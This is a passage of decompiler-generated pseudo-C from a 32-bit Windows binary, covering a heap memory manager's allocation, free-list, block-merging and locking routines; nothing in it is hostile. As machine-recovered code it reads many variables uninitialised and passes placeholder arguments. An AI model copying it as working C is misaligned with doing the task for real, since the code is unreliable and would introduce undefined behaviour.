            v3 = *(int32_t *)v4;
            while (v3 != (int32_t)&g68) {
                // 0x4015d9
                v4 = v3;
                v5 = (int32_t *)(v4 + 12);
                if (v2 <= *v5) {
                    // break (via goto) -> 0x4015de
                    goto lab_0x4015de;
                }
                // 0x40160a
                v3 = *(int32_t *)v4;
            }
        }
        // 0x401610
        result = function_401310();
    }
    // 0x40163f
    return result;
  lab_0x4015de:
    // 0x4015de
    result = function_4014a4();
    if (v2 == 0) {
        // 0x40163f
        return result;
    }
    int32_t * v8 = (int32_t *)(v6 + 4); // 0x4015ef
    int32_t * v9 = (int32_t *)(v4 + 8); // 0x4015f2
    *v9 = *v9 + *v8;
    int32_t v10 = *v8; // 0x4015f5
    int32_t v11 = *v5 - v10; // 0x4015f8
    *v5 = v11;
    result = v10;
    if (v11 == 0) {
        // 0x401601
        result = function_4011f4();
    }
  lab_0x40163f:
    // 0x40163f
    return result;
}

// Address range: 0x401648 - 0x40176b
int32_t function_401648(int32_t a1, int32_t a2) {
    // 0x401648
    int32_t v1; // 0x401648
    int32_t v2 = v1 + 0x3fff & -0x4000; // 0x401661
    int32_t v3; // 0x401648
    int32_t v4; // 0x401648
    int32_t v5; // 0x401648
    int32_t * v6; // 0x401648
    while (true) {
        int32_t v7 = &g68; // 0x401670
        if (g68 != (int32_t)&g68) {
            int32_t v8 = g68;
            v7 = v8;
            while (v5 != *(int32_t *)(v8 + 8)) {
                int32_t v9 = *(int32_t *)v8;
                int32_t v10 = v9; // 0x401670
                v7 = &g68;
                if (v9 == (int32_t)&g68) {
                    // break -> 0x401677
                    break;
                }
                v8 = v10;
                v7 = v8;
            }
        }
        // 0x401677
        v3 = v7;
        v6 = (int32_t *)(v3 + 8);
        int32_t v11; // 0x401648
        int32_t v12; // 0x401648
        if (v5 != *v6) {
            // 0x4016d3
            function_401374();
            if (v12 == 0) {
                // break -> 0x40171b
                break;
            }
            // 0x4016e7
            function_40120c();
            if (v11 == 0) {
                // 0x401701
                function_4013ec();
                *(int32_t *)v4 = 0;
                return result;
            }
        } else {
            // 0x40167c
            if (v2 <= *(int32_t *)(v3 + 12)) {
                // break -> 0x40171b
                break;
            }
            // 0x401685
            function_401374();
            if (v12 == 0) {
                // 0x4016d3
                function_401374();
                goto lab_0x40171b;
            }
            // 0x4016a0
            function_40120c();
            if (v11 == 0) {
                // 0x4016b6
                function_4013ec();
                *(int32_t *)v4 = 0;
                return result;
            }
        }
    }
    goto lab_0x40171b;
  lab_0x40171b:;
    // 0x40171b
    int32_t result; // 0x401648
    if (v5 != *v6) {
        // 0x40175c
        *(int32_t *)v4 = 0;
        // 0x401763
        return result;
    }
    int32_t * v13 = (int32_t *)(v3 + 12); // 0x401722
    if (v2 > *v13) {
        // 0x40175c
        *(int32_t *)v4 = 0;
        // 0x401763
        return result;
    }
    // 0x401727
    function_4014a4();
    if (v4 == 0) {
        // 0x401763
        return 0;
    }
    int32_t * v14 = (int32_t *)(v4 + 4); // 0x40173e
    *v6 = *v6 + *v14;
    int32_t v15 = *v14; // 0x401747
    int32_t v16 = *v13 - v15; // 0x40174a
    *v13 = v16;
    result = v15;
    if (v16 == 0) {
        // 0x401753
        result = function_4011f4();
    }
  lab_0x401763:
    // 0x401763
    return result;
}

// Address range: 0x40176c - 0x4017f8
int32_t function_40176c(void) {
    // 0x40176c
    int32_t v1; // 0x40176c
    int32_t v2; // 0x40176c
    if ((uint32_t)(v2 + 0x3fff & -0x4000) >= (uint32_t)(v2 + v1 & -0x4000)) {
        // 0x4017ed
        int32_t v3; // 0x40176c
        *(int32_t *)v3 = 0;
        // 0x4017f1
        return 0;
    }
    // 0x401792
    int32_t v4; // 0x40176c
    int32_t v5; // 0x40176c
    int32_t v6; // 0x40176c
    function_401538(v6, v5, v4);
    int32_t result = function_40120c(); // 0x4017b5
    int32_t v7; // 0x40176c
    if (v7 == 0) {
        // 0x4017f1
        return result;
    }
    // 0x4017d6
    function_4013ec();
    int32_t v8; // 0x40176c
    if (v8 != 0) {
        // 0x4017dd
        result = function_40127c();
    }
    // 0x4017f1
    return result;
}

// Address range: 0x4017f8 - 0x4018ae
int32_t function_4017f8(int32_t a1) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x401803
    __writefsdword(0, (int32_t)&v1);
    struct _RTL_CRITICAL_SECTION * v2 = (struct _RTL_CRITICAL_SECTION *)&g64; // bp-20, 0x401809
    InitializeCriticalSection((struct _RTL_CRITICAL_SECTION *)&g64);
    struct _RTL_CRITICAL_SECTION ** v3 = &v2; // 0x40181a
    if (g52 != 0) {
        struct _RTL_CRITICAL_SECTION * v4 = (struct _RTL_CRITICAL_SECTION *)&g64; // bp-24, 0x40181c
        EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g64);
        v3 = &v4;
    }
    int32_t v5 = (int32_t)v3;
    function_4011bc();
    function_4011bc();
    function_4011bc();
    int32_t * v6 = (int32_t *)(v5 - 4); // 0x401844
    *v6 = 4088;
    int32_t * v7 = (int32_t *)(v5 - 8); // 0x401849
    *v7 = 0;
    int32_t * memoryHandle = LocalAlloc((int32_t)&g111, (int32_t)&g111); // 0x40184b
    g74 = (int32_t)memoryHandle;
    if (memoryHandle != NULL) {
        // 0x401863
        *memoryHandle = 0;
        int32_t v8 = 3; // 0x40186f
        v8++;
        *(int32_t *)(g74 - 12 + 4 * v8) = 0;
        while (v8 != 1024) {
            // 0x401863
            v8++;
            *(int32_t *)(g74 - 12 + 4 * v8) = 0;
        }
        // 0x401877
        g70 = &g69;
        g69 = &g69;
        g71 = &g69;
        g62 = 1;
    }
    // 0x40188d
    __writefsdword(0, *v7);
    *(int32_t *)v3 = 0x4018b5;
    int32_t result = 0; // 0x4018a1
    if (g52 != 0) {
        // 0x4018a3
        *v6 = (int32_t)&g64;
        LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g111);
        result = &g111;
    }
    // 0x4018ad
    return result;
}

// Address range: 0x4018ae - 0x4018b3
int32_t function_4018ae(void) {
    // 0x4018ae
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x4018b3 - 0x4018b5
int32_t function_4018b3(void) {
    // 0x4018b3
    int32_t result; // 0x4018b3
    return result;
}

// Address range: 0x4018b5 - 0x4018bc
int32_t function_4018b5(int32_t a1) {
    // 0x4018b5
    int32_t v1; // 0x4018b5
    return v1 & -256 | (int32_t)(unsigned char)g62;
}

// Address range: 0x4018bc - 0x40199c
int32_t function_4018bc(void) {
    // 0x4018bc
    if (g62 == 0) {
        // 0x401999
        int32_t result; // 0x4018bc
        return result;
    }
    int32_t v1 = __readfsdword(0); // bp-20, 0x4018d5
    int32_t v2 = &v1; // 0x4018d5
    __writefsdword(0, v2);
    int32_t v3 = v2; // 0x4018e2
    if (g52 != 0) {
        struct _RTL_CRITICAL_SECTION * v4 = (struct _RTL_CRITICAL_SECTION *)&g64; // bp-24, 0x4018e4
        EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g64);
        v3 = (int32_t)&v4;
    }
    // 0x4018ee
    g62 = 0;
    int32_t v5 = v3 - 4; // 0x4018fa
    *(int32_t *)v5 = g74;
    LocalFree(&g111);
    g74 = 0;
    int32_t v6 = g67; // 0x401927
    int32_t v7 = v5; // 0x401927
    int32_t v8 = v5; // 0x401927
    if (g67 != (int32_t)&g67) {
        *(int32_t *)(v7 - 4) = 0x8000;
        *(int32_t *)(v7 - 8) = 0;
        v7 -= 12;
        *(int32_t *)v7 = *(int32_t *)(v6 + 8);
        VirtualFree(&g111, (int32_t)&g111, (int32_t)&g111);
        v6 = *(int32_t *)v6;
        v8 = v7;
        while (v6 != (int32_t)&g67) {
            // 0x40190f
            *(int32_t *)(v7 - 4) = 0x8000;
            *(int32_t *)(v7 - 8) = 0;
            v7 -= 12;
            *(int32_t *)v7 = *(int32_t *)(v6 + 8);
            VirtualFree(&g111, (int32_t)&g111, (int32_t)&g111);
            v6 = *(int32_t *)v6;
            v8 = v7;
        }
    }
    // 0x401929
    function_4011bc();
    function_4011bc();
    function_4011bc();
    int32_t v9 = g65; // 0x40194e
    int32_t v10 = v8; // 0x40194e
    int32_t * v11; // 0x4018bc
    int32_t v12; // 0x4018bc
    if (g65 == 0) {
        // 0x401929
        v11 = (int32_t *)v8;
        v12 = v8;
    } else {
        g65 = *(int32_t *)v9;
        v10 -= 4;
        int32_t * v13 = (int32_t *)v10;
        *v13 = v9;
        LocalFree(&g111);
        v9 = g65;
        v11 = v13;
        v12 = v10;
        while (v9 != 0) {
            // 0x401950
            g65 = *(int32_t *)v9;
            v10 -= 4;
            v13 = (int32_t *)v10;
            *v13 = v9;
            LocalFree(&g111);
            v9 = g65;
            v11 = v13;
            v12 = v10;
        }
    }
    // 0x401967
    __writefsdword(0, *v11);
    int32_t v14 = v12 + 8; // 0x40196f
    *(int32_t *)v14 = 0x401999;
    int32_t v15 = v14; // 0x40197b
    if (g52 != 0) {
        // 0x40197d
        v15 = v12 + 4;
        *(int32_t *)v15 = (int32_t)&g64;
        LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g111);
    }
    // 0x401987
    *(int32_t *)(v15 - 4) = (int32_t)&g64;
    DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g111);
    return &g111;
}

// Address range: 0x40199c - 0x4019fd
int32_t function_40199c(void) {
    // 0x40199c
    int32_t result2; // 0x40199c
    int32_t * v1 = (int32_t *)(result2 + 4);
    if (result2 == g71) {
        // 0x4019a5
        g71 = *v1;
    }
    int32_t v2 = *v1; // 0x4019ae
    int32_t v3 = *(int32_t *)(result2 + 8); // 0x4019b1
    if (v3 > 0x1000) {
        // 0x4019f4
        *v1 = v2;
        // 0x4019fb
        int32_t result; // 0x40199c
        return result;
    }
    int32_t * v4 = (int32_t *)(g74 + ((v3 >= 0 ? v3 : v3 + 3) - 12 & -4));
    if (result2 == v2) {
        // 0x4019c0
        *v4 = 0;
        // 0x4019fb
        return g74;
    }
    // 0x4019d7
    *v4 = v2;
    *v1 = v2;
    return result2;
}

// Address range: 0x401a00 - 0x401a2f
int32_t function_401a00(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x401a00
    if (g75 != (int32_t)&g75) {
        uint32_t v1 = *(int32_t *)(g75 + 8); // 0x401a08
        uint32_t v2; // 0x401a00
        if (v2 >= v1) {
            // 0x401a0f
            if (v2 < *(int32_t *)(g75 + 12) + v1) {
                // 0x401a2c
                return g75;
            }
        }
        int32_t v3 = *(int32_t *)g75;
        while (v3 != (int32_t)&g75) {
            int32_t v4 = v3;
            v1 = *(int32_t *)(v4 + 8);
            if (v2 >= v1) {
                int32_t result = v4; // 0x401a14
                if (v2 < *(int32_t *)(v4 + 12) + v1) {
                    // 0x401a2c
                    return result;
                }
            }
            // 0x401a16
            v3 = *(int32_t *)v4;
        }
    }
    // 0x401a20
    g63 = 3;
    // 0x401a2c
    return 0;
}

// Address range: 0x401a30 - 0x401a60
int32_t function_401a30(void) {
    // 0x401a30
    uint32_t v1; // 0x401a30
    int32_t result; // 0x401a30
    int32_t v2 = v1 - 4 + result; // 0x401a36
    if (v1 >= 16) {
        // 0x401a3e
        *(int32_t *)v2 = -0x7ffffff9;
        return function_401c04();
    }
    if (v1 >= 4) {
        int32_t v3 = v1 | -0x7ffffffe; // 0x401a54
        *(int32_t *)result = v3;
        *(int32_t *)v2 = v3;
    }
    // 0x401a5e
    return result;
}

// Address range: 0x401a60 - 0x401a82
int32_t function_401a60(void) {
    // 0x401a60
    g58++;
    int32_t v1; // 0x401a60
    g59 += (*(int32_t *)(v1 - 4) & 0x7ffffffc) - 4;
    return function_402074();
}

// Address range: 0x401a84 - 0x401aac
int32_t function_401a84(void) {
    // 0x401a84
    uint32_t v1; // 0x401a84
    int32_t v2; // 0x401a84
    if (v1 >= 12) {
        // 0x401a89
        *(int32_t *)v2 = v1 | 2;
        return function_401a60();
    }
    if (v1 >= 4) {
        // 0x401a9c
        *(int32_t *)v2 = v1 | -0x7ffffffe;
    }
    int32_t result = v2 + v1; // 0x401aa6
    int32_t * v3 = (int32_t *)result; // 0x401aa8
    *v3 = *v3 & -2;
    return result;
}

// Address range: 0x401aac - 0x401b19
int32_t function_401aac(void) {
    // 0x401aac
    int32_t v1; // 0x401aac
    int32_t v2 = *(int32_t *)(v1 - 4); // 0x401ab3
    if ((v2 & -0x7ffffffe) != -0x7ffffffe) {
        // 0x401ac5
        g63 = 4;
    }
    int32_t result = v2 & 0x7ffffffc; // 0x401ad1
    int32_t v3 = v1 - result; // 0x401ad7
    if ((*(int32_t *)v3 ^ v2) >= 2) {
        // 0x401ae5
        g63 = 5;
    }
    // 0x401aef
    if ((*(char *)v3 & 1) == 0) {
        // 0x401b14
        return result;
    }
    int32_t v4 = *(int32_t *)(v3 - 4); // 0x401af9
    if (v4 != *(int32_t *)(v3 + 8 - v4)) {
        // 0x401b03
        g63 = 6;
    }
    // 0x401b0d
    function_40199c();
    // 0x401b14
    return v4 + result;
}

// Address range: 0x401b1c - 0x401b54
int32_t function_401b1c(void) {
    int32_t v1 = 0; // 0x401b2a
    int32_t v2; // 0x401b1c
    int32_t v3; // 0x401b1c
    uint32_t v4; // 0x401b1c
    if (v4 <= 0xffffffff) {
        // 0x401b2c
        v1 = v4 & 0x7ffffffc;
        int32_t v5 = v1 + v4; // 0x401b33
        v2 = *(int32_t *)v5;
        v3 = v5;
    }
    int32_t result = v1; // 0x401b39
    if ((v2 & 2) == 0) {
        // 0x401b3b
        function_40199c();
        int32_t v6 = *(int32_t *)(v3 + 8); // 0x401b44
        int32_t * v7 = (int32_t *)(v6 + v3); // 0x401b4b
        *v7 = *v7 & -2;
        result = v6 + v1;
    }
    // 0x401b4e
    return result;
}

// Address range: 0x401b54 - 0x401c01
int32_t function_401b54(int32_t a1, int32_t a2, int32_t a3) {
    // 0x401b54
    int32_t v1; // 0x401b54
    int32_t v2; // 0x401b54
    int32_t v3; // 0x401b54
    int32_t v4; // 0x401b54
    int32_t v5 = function_401a00(v4, v2, v1, v3); // 0x401b65
    if (v5 == 0) {
        // 0x401bf6
        return 0;
    }
    int32_t v6 = function_40176c(); // 0x401bc0
    int32_t v7; // 0x401b54
    if (v7 == 0) {
        // 0x401bf6
        return v6 & -256;
    }
    // 0x401bc2
    function_401a30();
    int32_t v8; // 0x401b54
    if (v7 + v8 < *(int32_t *)(v5 + 12) + *(int32_t *)(v5 + 8)) {
        // 0x401bdd
        function_401a84();
    }
    // 0x401bf6
    return function_40127c() & -256 | 1;
}

// Address range: 0x401c04 - 0x401c89
int32_t function_401c04(void) {
    // 0x401c04
    uint32_t v1; // 0x401c04
    int32_t v2; // 0x401c04
    if (v1 > 0x1000) {
        if (v1 >= 0x3c00) {
            // 0x401c61
            int32_t v3; // 0x401c04
            int32_t v4; // 0x401c04
            int32_t v5; // 0x401c04
            int32_t result = function_401b54(v5, v4, v3); // 0x401c65
            if ((char)result != 0) {
                // 0x401c85
                return result;
            }
        }
        // 0x401c6e
        *(int32_t *)(v2 + 4) = g71;
        *(int32_t *)v2 = *(int32_t *)g71;
        // 0x401c85
        return g71;
    }
    int32_t v6 = (int32_t)v1 >= 0 ? v1 : v1 + 3;
    int32_t v7 = *(int32_t *)(g74 + (v6 - 12 & -4)); // 0x401c33
    int32_t result2; // 0x401c04
    if (v7 != 0) {
        // 0x401c4b
        *(int32_t *)(v2 + 4) = v7;
        *(int32_t *)v2 = *(int32_t *)v7;
        result2 = v7;
    } else {
        // 0x401c3b
        result2 = g74;
    }
    // 0x401c85
    return result2;
}

// Address range: 0x401c8c - 0x401cd6
int32_t function_401c8c(void) {
    // 0x401c8c
    int32_t result; // 0x401c8c
    if (g72 < 1) {
        // 0x401cd5
        return result;
    }
    if (g72 > 11) {
        // 0x401caa
        *(int32_t *)g73 = g72 | 2;
        function_401a60();
        g73 = 0;
        g72 = 0;
        result = 0;
    } else {
        // 0x401c9e
        g63 = 7;
    }
    // 0x401cd5
    return result;
}

// Address range: 0x401cd8 - 0x401d61
int32_t function_401cd8(void) {
    // 0x401cd8
    bool v1; // 0x401cd8
    int32_t v2 = v1 ? -4 : 4; // 0x401ce3
    int32_t v3; // 0x401cd8
    int32_t v4 = *(int32_t *)(v2 + v3); // 0x401ce4
    int32_t v5; // bp-28, 0x401cd8
    *(int32_t *)(v2 + (int32_t)&v5) = v4;
    function_401c8c();
    function_40120c();
    uint32_t v6; // 0x401cd8
    if (v6 == 0) {
        // 0x401d5a
        return 0;
    }
    int32_t v7 = v5; // 0x401d0c
    int32_t v8; // 0x401cd8
    if (v6 < v5) {
        int32_t v9 = function_401aac(); // 0x401d0e
        v7 = v5 - v9;
        v5 = v7;
        int32_t v10; // 0x401cd8
        v8 = v9 + v10;
    }
    int32_t v11 = v8 + v7;
    int32_t v12; // 0x401cd8
    uint32_t v13 = v6 + v12; // 0x401d1f
    int32_t v14 = v11; // 0x401d25
    int32_t v15 = v7; // 0x401d25
    int32_t v16 = v8; // 0x401d25
    if (v11 < v13) {
        // 0x401d27
        v16 = function_401b1c() + v8;
        v15 = v5;
        v14 = v15 + v16;
    }
    // 0x401d2f
    v5 = v15;
    int32_t v17 = v16; // 0x401d36
    if (v13 == v14) {
        // 0x401d38
        function_401a30();
        v17 = v16 - 4;
    }
    // 0x401d49
    g73 = v5;
    g72 = v17;
    // 0x401d5a
    return v17 & -256 | 1;
}

// Address range: 0x401d64 - 0x401d8f
int32_t function_401d64(void) {
    // 0x401d64
    int32_t v1; // 0x401d64
    function_4015b8(v1);
    int32_t v2; // 0x401d64
    if (v2 == 0) {
        // 0x401d8b
        return 0;
    }
    int32_t v3 = function_401cd8(); // 0x401d7c
    int32_t result = 0; // 0x401d83
    if ((char)v3 != 0) {
        // 0x401d89
        result = v3 & -256 | 1;
    }
    // 0x401d8b
    return result;
}

// Address range: 0x401d90 - 0x401dc1
int32_t function_401d90(void) {
    // 0x401d90
    int32_t v1; // 0x401d90
    int32_t v2; // 0x401d90
    function_401648(v2, v1);
    int32_t v3; // 0x401d90
    if (v3 == 0) {
        // 0x401dbc
        return 0;
    }
    int32_t v4 = function_401cd8(); // 0x401dad
    int32_t result = 0; // 0x401db4
    if ((char)v4 != 0) {
        // 0x401dba
        result = v4 & -256 | 1;
    }
    // 0x401dbc
    return result;
}

// Address range: 0x401dc4 - 0x401df0
int32_t function_401dc4(void) {
    // 0x401dc4
    int32_t v1; // 0x401dc4
    int32_t v2 = v1 >= 0 ? v1 : v1 + 3;
    if (v2 > 0x1003) {
        // 0x401ded
        return 0;
    }
    int32_t v3 = v2 / 4;
    int32_t result = *(int32_t *)(g74 - 12 + 4 * v3); // 0x401ddd
    while (result == 0) {
        // 0x401dd7
        if (v3 == 1024) {
            // break -> 0x401ded
            break;
        }
        // 0x401de5
        v3++;
        result = *(int32_t *)(g74 - 12 + 4 * v3);
    }
    // 0x401ded
    return result;
}

// Address range: 0x401df0 - 0x401ee4
int32_t function_401df0(void) {
    int32_t v1 = g70 + 8;
    int32_t v2 = v1; // 0x401e09
    int32_t v3 = g70; // 0x401e09
    // 0x401df0
    int32_t result; // 0x401df0
    uint32_t v4; // 0x401df0
    while (v4 > *(int32_t *)v1) {
        int32_t v5 = g71; // 0x401e0f
        int32_t v6 = v5 + 8;
        uint32_t v7 = *(int32_t *)v6; // 0x401e11
        v2 = v6;
        v3 = v5;
        if (v4 <= v7) {
            // break -> 0x401e93
            break;
        }
        int32_t v8 = *(int32_t *)(v5 + 4); // 0x401e1b
        int32_t v9 = v8 + 8;
        int32_t v10 = v8; // 0x401e21
        while (v4 > *(int32_t *)v9) {
            // 0x401e1b
            v8 = *(int32_t *)(v10 + 4);
            v9 = v8 + 8;
            v10 = v8;
        }
        // 0x401e23
        *(int32_t *)(g71 + 8) = v7;
        if (v8 != g71) {
            // 0x401e2c
            g71 = v8;
            v2 = v9;
            v3 = v8;
            goto lab_0x401e93;
        }
        if (v4 <= 0x1000) {
            int32_t v11 = function_401dc4(); // 0x401e3a
            if (v11 != 0) {
                // 0x401e38
                v2 = v11 + 8;
                v3 = v11;
                goto lab_0x401e93;
            }
        }
        // 0x401e45
        if ((char)function_401d64() == 0) {
            // 0x401edf
            return 0;
        }
        // 0x401e57
        if (g72 >= v4) {
            int32_t v12 = g72 - v4; // 0x401e5c
            int32_t v13 = v12 > 11 ? v4 : g72;
            g72 = v12 > 11 ? v12 : 0;
            int32_t v14 = g73;
            g73 = v14 + v13;
            *(int32_t *)v14 = v13 | 2;
            g58++;
            g59 += v13 - 4;
            result = v14 + 4;
            return result;
        }
        v1 = g70 + 8;
        v2 = v1;
        v3 = g70;
    }
    goto lab_0x401e93;
  lab_0x401e93:
    // 0x401e93
    function_40199c();
    int32_t v15 = *(int32_t *)v2; // 0x401e9a
    int32_t v16; // 0x401df0
    if (v15 - v4 < 12) {
        // 0x401eb2
        if (v3 == g71) {
            // 0x401eb8
            g71 = *(int32_t *)(v3 + 4);
        }
        int32_t * v17 = (int32_t *)(v15 + v3); // 0x401ec1
        *v17 = *v17 & -2;
        v16 = v15;
    } else {
        // 0x401ea6
        function_401c04();
    }
    // 0x401ec4
    *(int32_t *)v3 = v16 | 2;
    g58++;
    g59 += v16 - 4;
    result = v3 + 4;
  lab_0x401edf:
    // 0x401edf
    return result;
}

// Address range: 0x401ee4 - 0x402060
int32_t function_401ee4(void) {
    // 0x401ee4
    uint32_t v1; // 0x401ee4
    int32_t result; // 0x401f0e
    if (g62 != 0) {
        if (v1 >= 0x7ffffff9) {
            // 0x401f09
            result = function_402067(0, (int32_t)&g111, (int32_t)&g111, (int32_t)&g111, (int32_t)&g111, (int32_t)&g111);
            return result;
        }
    } else {
        // 0x401ef8
        int32_t v2; // 0x401ee4
        if (v1 < 0x7ffffff9 != (char)function_4017f8(v2) != 0) {
            // 0x401f09
            result = function_402067(0, (int32_t)&g111, (int32_t)&g111, (int32_t)&g111, (int32_t)&g111, (int32_t)&g111);
            return result;
        }
    }
    int32_t v3 = __readfsdword(0); // bp-36, 0x401f1b
    int32_t v4 = &v3; // 0x401f1b
    __writefsdword(0, v4);
    int32_t v5 = v4; // 0x401f28
    if (g52 != 0) {
        struct _RTL_CRITICAL_SECTION * v6 = (struct _RTL_CRITICAL_SECTION *)&g64; // bp-40, 0x401f2a
        EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g64);
        v5 = (int32_t)&v6;
    }
    int32_t v7 = v1 + 7 & -4; // 0x401f37
    uint32_t v8 = v7 > 12 ? v7 : 12;
    if (v8 <= 0x1000) {
        int32_t v9 = v8 - 12;
        int32_t v10 = *(int32_t *)(g74 + v9); // 0x401f62
        if (v10 != 0) {
            int32_t * v11 = (int32_t *)(v10 + v8); // 0x401f70
            *v11 = *v11 & -2;
            int32_t v12 = v10 + 4; // 0x401f73
            int32_t v13 = *(int32_t *)v12; // 0x401f73
            int32_t * v14 = (int32_t *)(g74 + v9);
            int32_t * v15; // 0x401ee4
            if (v10 != v13) {
                // 0x401f9d
                *v14 = v13;
                int32_t * v16 = (int32_t *)v10;
                int32_t v17 = *v16; // 0x401faa
                *(int32_t *)(v17 + 4) = v13;
                *(int32_t *)v13 = v17;
                v15 = v16;
            } else {
                // 0x401f83
                *v14 = 0;
                v15 = (int32_t *)v10;
            }
            // 0x401fba
            *v15 = *(int32_t *)(v10 + 8) | 2;
            g58++;
            g59 += v8 - 4;
            function_402e40(v12, (int32_t)&g111);
            int32_t result2 = function_402067((int32_t)&g111, (int32_t)&g111, (int32_t)&g111, (int32_t)&g111, (int32_t)&g111, (int32_t)&g111); // 0x401fde
            return result2;
        }
    }
    // 0x401fe3
    if (g72 < v8) {
        // 0x402035
        function_401df0();
        __writefsdword(0, *(int32_t *)v5);
        *(int32_t *)(v5 + 8) = 0x402067;
        int32_t result3 = 0; // 0x402053
        if (g52 != 0) {
            // 0x402055
            *(int32_t *)(v5 + 4) = (int32_t)&g64;
            LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g111);
            result3 = &g111;
        }
        // 0x40205f
        return result3;
    }
    int32_t v18 = g72 - v8; // 0x401feb
    int32_t v19 = v18 > 11 ? v8 : g72;
    g72 = v18 > 11 ? v18 : 0;
    int32_t v20 = g73;
    g73 = v20 + v19;
    *(int32_t *)v20 = v19 | 2;
    g58++;
    g59 += v19 - 4;
    function_402e40(v20 + 4, (int32_t)&g111);
    int32_t result4 = function_402067((int32_t)&g111, (int32_t)&g111, (int32_t)&g111, (int32_t)&g111, (int32_t)&g111, (int32_t)&g111); // 0x402033
    return result4;
}

// Address range: 0x402060 - 0x402065
int32_t function_402060(void) {
    // 0x402060
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x402065 - 0x402067
int32_t function_402065(void) {
    // 0x402065
    int32_t result; // 0x402065
    return result;
}

// Address range: 0x402067 - 0x402071
int32_t function_402067(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x402067
    int32_t v1; // 0x402067
    return *(int32_t *)(v1 - 4);
}

// Address range: 0x402074 - 0x402206
int32_t function_402074(void) {
    // 0x402074
    g63 = 0;
    if (g62 == 0) {
        // 0x40208d
        int32_t v1; // 0x402074
        if ((char)function_4017f8(v1) == 0) {
            // 0x402096
            g63 = 8;
            int32_t result = function_40220d(8, (int32_t)&g111, (int32_t)&g111, (int32_t)&g111, (int32_t)&g111); // 0x4020a7
            return result;
        }
    }
    int32_t v2 = __readfsdword(0); // bp-32, 0x4020b4
    int32_t v3 = &v2; // 0x4020b4
    __writefsdword(0, v3);
    int32_t v4 = v3; // 0x4020c1
    if (g52 != 0) {
        struct _RTL_CRITICAL_SECTION * v5 = (struct _RTL_CRITICAL_SECTION *)&g64; // bp-36, 0x4020c3
        EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g64);
        v4 = (int32_t)&v5;
    }
    // 0x4020cd
    int32_t v6; // 0x402074
    int32_t v7 = v6 - 4; // 0x4020cf
    int32_t v8 = *(int32_t *)v7; // 0x4020d2
    int32_t v9; // 0x402074
    int32_t v10; // 0x402074
    if ((v8 & 2) != 0) {
        // 0x4020e8
        g58--;
        int32_t v11 = v8 & 0x7ffffffc;
        g59 += 4 - v11;
        v9 = v11;
        v10 = v7;
        if ((v8 & 1) == 0) {
            goto lab_0x402148;
        } else {
            int32_t v12 = *(int32_t *)(v6 - 8); // 0x402108
            if (v12 > 11 == (v12 & -0x7ffffffd) == 0) {
                int32_t v13 = v7 - v12; // 0x402129
                if (v12 == *(int32_t *)(v13 + 8)) {
                    // 0x40213f
                    function_40199c();
                    v9 = v12 + v8 & 0x7ffffffc;
                    v10 = v13;
                    goto lab_0x402148;
                } else {
                    // 0x402130
                    g63 = 10;
                    goto lab_0x4021dd;
                }
            } else {
                // 0x402118
                g63 = 10;
                goto lab_0x4021dd;
            }
        }
    } else {
        // 0x4020d9
        g63 = 9;
        goto lab_0x4021dd;
    }
  lab_0x402148:;
    int32_t v14 = v10 + v9; // 0x402150
    if (v14 == g73) {
        // 0x40215c
        g73 -= v9;
        int32_t v15 = g72 + v9; // 0x402162
        g72 = v15;
        if (v15 >= 0x3c01) {
            // 0x402174
            function_401c8c();
        }
        // 0x402179
        function_402e40(0, (int32_t)&g111);
        int32_t result2 = function_40220d((int32_t)&g111, (int32_t)&g111, (int32_t)&g111, (int32_t)&g111, (int32_t)&g111); // 0x402183
        return result2;
    }
    int32_t * v16 = (int32_t *)v14; // 0x402188
    int32_t v17 = *v16; // 0x402188
    if ((v17 & 2) == 0) {
        // 0x4021ab
        if (v17 == 0 | *(int32_t *)(v14 + 4) == 0) {
            // 0x4021be
            g63 = 11;
            goto lab_0x4021dd;
        } else {
            // 0x4021b8
            if (*(int32_t *)(v14 + 8) > 11) {
                // 0x4021ca
                function_40199c();
                // 0x4021d4
                function_401c04();
                goto lab_0x4021dd;
            } else {
                // 0x4021be
                g63 = 11;
                goto lab_0x4021dd;
            }
        }
    } else {
        if ((v17 & 0x7ffffffc) == 0) {
            // 0x40219a
            g63 = 11;
            goto lab_0x4021dd;
        } else {
            // 0x4021a6
            *v16 = v17 | 1;
            // 0x4021d4
            function_401c04();
            goto lab_0x4021dd;
        }
    }
  lab_0x4021dd:
    // 0x4021dd
    __writefsdword(0, *(int32_t *)v4);
    *(int32_t *)(v4 + 8) = 0x40220d;
    int32_t result3 = 0; // 0x4021f9
    if (g52 != 0) {
        // 0x4021fb
        *(int32_t *)(v4 + 4) = (int32_t)&g64;
        LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g111);
        result3 = &g111;
    }
    // 0x402205
    return result3;
}

// Address range: 0x402206 - 0x40220b
int32_t function_402206(void) {
    // 0x402206
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x40220b - 0x40220d
int32_t function_40220b(void) {
    // 0x40220b
    int32_t result; // 0x40220b
    return result;
}

// Address range: 0x40220d - 0x402216
int32_t function_40220d(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x40220d
    int32_t v1; // 0x40220d
    return *(int32_t *)(v1 - 4);
}

// Address range: 0x402218 - 0x4023f2
int32_t function_402218(void) {
    // 0x402218
    int32_t v1; // 0x402218
    int32_t v2 = v1 + 7 & -4; // 0x402224
    int32_t v3 = v2 > 12 ? v2 : 12;
    int32_t v4; // 0x402218
    int32_t v5 = v4 - 4; // 0x402233
    int32_t * v6 = (int32_t *)v5; // 0x402236
    int32_t v7 = *v6 & 0x7ffffffc; // 0x402239
    int32_t v8 = v7 + v5; // 0x402241
    if (v7 == v3) {
        // 0x4023eb
        return v8 & -256 | 1;
    }
    int32_t v9; // 0x402218
    if (v7 > v3) {
        int32_t v10 = v7 - v3; // 0x40225a
        int32_t v11 = g73; // 0x40225f
        if (v8 != v11) {
